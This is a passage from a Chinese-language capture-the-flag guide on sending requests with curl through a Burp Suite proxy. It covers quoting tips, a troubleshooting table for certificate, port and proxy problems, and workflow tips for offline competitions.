     -H 'Content-Type: application/x-www-form-urlencoded' --data-binary 'a=1'
```
预期结果：一条命令拿到完整响应头+体，lambda 复现题、遍历题都能原地打。
如果不行：URL 里含 `&`、`#`、`;` 时记得整体单引号包裹；POST 体非表单格式（JSON/文件）改用 `-H 'Content-Type: application/json'` + `--data '...'` 或 `-F`。
#### 常见错误与排查

| 现象 | 原因 | 解决 |
|---|---|---|
| http 能抓 https 报证书错 | Burp CA 没装进受信任根 | 走第 2 步重装；命令行 `-k` 应急 |
| Burp 里看不到任何流量 | 代理没指对 / Burp 没监听 | 确认监听 127.0.0.1:8080；浏览器代理设置生效 |
| 走代理后网站打不开 | 目标站禁代理或代理与 VPN 冲突 | 关 VPN/换代理端口；或改纯命令行直打 |
| curl 报 proxy CONNECT 失败 | Burp 未运行或端口被占 | 重启 Burp；`netstat -ano | findstr 8080` 查占用 |
| 无痕窗口不走代理 | 无痕模式不带系统代理 | 无痕窗口内手动配置代理，或换普通窗口 |

#### 实战要点
- 线下赛固定动作：浏览器全流量过 Burp + `Logger++` 留痕，赛后复盘全靠它。
- HTTPS 报证书错是「没装证书」的标志，不是代理坏了，别慌着改端口。
- 重放类题目优先 Burp Repeater；批量遍历优先 curl 循环，两条路都要熟。
- 命令行流量进代理记得 `-x http://127.0.0.1:8080`，忘了加就抓不到。
- 代理挂了先查端口占用和监听状态，环境问题是线下赛最大的时间黑洞。